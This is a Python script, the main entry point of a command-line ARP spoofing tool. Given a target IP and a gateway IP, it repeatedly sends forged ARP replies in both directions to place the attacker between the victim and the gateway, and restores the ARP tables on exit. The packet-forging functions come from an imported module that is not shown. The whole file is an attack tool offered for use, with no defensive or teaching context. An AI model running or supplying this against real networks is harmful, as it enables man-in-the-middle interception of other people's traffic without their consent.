import time
import argparse
from utils.network import spoof, restore
from utils.console import print_red

# Main program entry point
def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing tool")
    parser.add_argument("--target", "-t", required=True, help="Target IP address")
    parser.add_argument("--gateway", "-gt", required=True, help="Gateway IP address")
    args = parser.parse_args()

    target_ip = args.target
    gateway_ip = args.gateway

    print_red("Starting...")

    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print_red(f"\r[+] sent {sent_packets_count} packets")
            time.sleep(2)

    except KeyboardInterrupt:
        print_red("\n[+] Quitting.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print_red("[+] ARP tables restored.")


if __name__ == "__main__":
    main()
